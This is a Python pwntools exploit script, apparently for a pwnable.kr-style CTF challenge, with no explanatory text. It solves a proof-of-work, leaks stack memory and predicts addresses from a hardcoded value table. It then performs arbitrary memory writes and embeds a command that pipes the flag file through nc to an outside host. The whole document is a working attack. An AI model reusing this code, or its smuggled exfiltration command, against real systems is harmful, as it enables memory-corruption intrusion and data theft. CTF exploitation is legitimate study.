from hashlib import *
from pwn import *
t = [7567884774754821, 7567928725024141, 7567972675293461, 7568016625562781, 7568060575832101, 7568104526101421, 7568148476370741, 7568192426640061, 7568236376909381, 7568280327178701, 7568324277448021, 7568368227717341, 7568412177986661, 7568456128255981, 7568500078525301, 7568544028794621, 7568587979063941, 7568631929333261, 7568675879602581, 7568719829871901, 7568763780141221, 7568807730410541, 7568851680679861, 7568895630949181, 7568939581218501, 7568983531487821, 7569027481757141, 7569071432026461, 7569115382295781, 7569159332565101, 7569203282834421, 7569247233103741, 7569291183373061, 7569335133642381, 7569379083911701, 7569423034181021, 7569466984450341, 7569510934719661, 7569554884988981, 7569598835258301, 7569642785527621, 7569686735796941, 7569730686066261, 7569774636335581, 7569818586604901, 7569862536874221, 7569906487143541, 7569950437412861, 7569994387682181, 7570038337951501, 7570082288220821, 7570126238490141, 7570170188759461, 7570214139028781, 7570258089298101, 7570302039567421, 7570345989836741, 7570389940106061, 7570433890375381, 7570477840644701, 7570521790914021, 7570565741183341, 7570609691452661, 7570653641721981, 7570697591991301, 7570741542260621, 7570785492529941, 7570829442799261, 7570873393068581, 7570917343337901, 7570961293607221, 7571005243876541, 7571049194145861, 7571093144415181, 7571137094684501, 7571181044953821, 7571224995223141, 7571268945492461, 7571312895761781, 7571356846031101, 7571400796300421, 7571444746569741, 7571488696839061, 7571532647108381, 7571576597377701, 7571620547647021, 7571664497916341, 7571708448185661, 7571752398454981, 7571796348724301, 7571840298993621, 7571884249262941, 7571928199532261, 7571972149801581, 7572016100070901, 7572060050340221, 7572104000609541, 7572147950878861, 7572191901148181, 7572235851417501, 7572279801686821, 7572323751956141, 7572367702225461, 7572411652494781, 7572455602764101, 7572499553033421, 7572543503302741, 7572587453572061, 7572631403841381, 7572675354110701, 7572719304380021, 7572763254649341, 7572807204918661, 7572851155187981, 7572895105457301, 7572939055726621, 7572983005995941, 7573026956265261, 7573070906534581, 7573114856803901, 7573158807073221, 7573202757342541, 7573246707611861, 7573290657881181, 7573334608150501, 7573378558419821, 7573422508689141, 7573466458958461, 7573510409227781, 7573554359497101, 7573598309766421, 7573642260035741, 7573686210305061, 7573730160574381, 7573774110843701, 7573818061113021, 7573862011382341, 7573905961651661, 7573949911920981, 7573993862190301, 7574037812459621, 7574081762728941, 7574125712998261, 7574169663267581, 7574213613536901, 7574257563806221, 7574301514075541, 7574345464344861, 7574389414614181, 7574433364883501, 7574477315152821, 7574521265422141, 7574565215691461, 7574609165960781, 7574653116230101, 7574697066499421, 7574741016768741, 7574784967038061, 7574828917307381, 7574872867576701, 7574916817846021, 7574960768115341, 7575004718384661, 7575048668653981, 7575092618923301, 7575136569192621, 7575180519461941, 7575224469731261, 7575268420000581, 7575312370269901, 7575356320539221, 7575400270808541, 7575444221077861, 7575488171347181, 7575532121616501, 7575576071885821, 7575620022155141, 7575663972424461, 7575707922693781, 7575751872963101, 7575795823232421, 7575839773501741, 7575883723771061, 7575927674040381, 7575971624309701, 7576015574579021, 7576059524848341, 7576103475117661, 7576147425386981, 7576191375656301, 7576235325925621, 7576279276194941, 7576323226464261, 7576367176733581, 7576411127002901, 7576455077272221, 7576499027541541, 7576542977810861, 7576586928080181, 7576630878349501, 7576674828618821, 7576718778888141, 7576762729157461, 7576806679426781, 7576850629696101, 7576894579965421, 7576938530234741, 7576982480504061, 7577026430773381, 7577070381042701, 7577114331312021, 7577158281581341, 7577202231850661, 7577246182119981, 7577290132389301, 7577334082658621, 7577378032927941, 7577421983197261, 7577465933466581, 7577509883735901, 7577553834005221, 7577597784274541, 7577641734543861, 7577685684813181, 7577729635082501, 7577773585351821, 7577817535621141, 7577861485890461, 7577905436159781, 7577949386429101, 7577993336698421, 7578037286967741, 7578081237237061, 7578125187506381, 7578169137775701, 7578213088045021, 7578257038314341, 7578300988583661, 7578344938852981, 7578388889122301, 7578432839391621, 7578476789660941, 7578520739930261, 7578564690199581, 7578608640468901, 7578652590738221, 7578696541007541, 7578740491276861, 7578784441546181, 7578828391815501, 7578872342084821, 7578916292354141, 7578960242623461, 7579004192892781, 7579048143162101, 7579092093431421]

r = remote("192.168.33.10",1234)
chal = r.recvuntil("\n")[:-1]
chal = chal.decode('hex')
myinput = 0
while True:
    my = ("%x" % myinput).rjust(0x40, "0")
    my = my.decode('hex')
    if sha512(chal+my).hexdigest()[:4] == "0000":
        break
    myinput += 1
r.sendline(my.encode('hex'))
def hash(prevalue):
    final = 0x1505
    for i in range(8):
        final += prevalue[i] + 32*final
    return final
stack = 0
def dump():
    global stack
    l = []
    r.recvuntil("? (Y/N) ")
    r.sendline('N')
    r.recvlines(2)
    r.recvn(1)
    for i in range(32):
        l.append(u64(r.recvn(8)))
    stack = l[0] - 4832
    print hex(stack)
    key = ((l[21] >> 12) & 0xffffff)
    for i,x in enumerate(t):
        if (x & 0xffffff) == key:return i
init = bytearray(chr(dump())*8)
def leak(m=False):
    global init
    for x in range(3):
        init = hash(init)
        init = bytearray(p64(init))
    for x in range(3):
        init = hash(init)
        print hex(0x600000000000 | (init & 0xffffff) << 12)
        init = bytearray(p64(init))
libc = raw_input('libc : ')
libc = int(libc,16)

r.recvuntil("? (Y/N) ")
r.sendline('Y')
r.recvuntil(': ')
r.send(hex(stack+0x750)[2:]+"\x00cat flag|nc pwnable")
r.recvuntil('!\n')
r.send(".kr 1234")

r.recvuntil("? (Y/N) ")
r.sendline('Y')
r.recvuntil(': ')
r.sendline(hex(stack+0x8)[2:])
r.recvuntil('!\n')
r.send(p64(0x42424242))

r.recvuntil("? (Y/N) ")
r.sendline('Y')
r.recvuntil(': ')
r.sendline(hex(stack+0x28)[2:])
r.recvuntil('!\n')
r.send(p64(0x41414141))

r.recvuntil("? (Y/N) ")
r.sendline('Y')
r.recvuntil(': ')
r.sendline(hex(stack+0x0)[2:])
r.recvuntil('!\n')
r.send(p64(0xdeadbeef))
r.interactive()
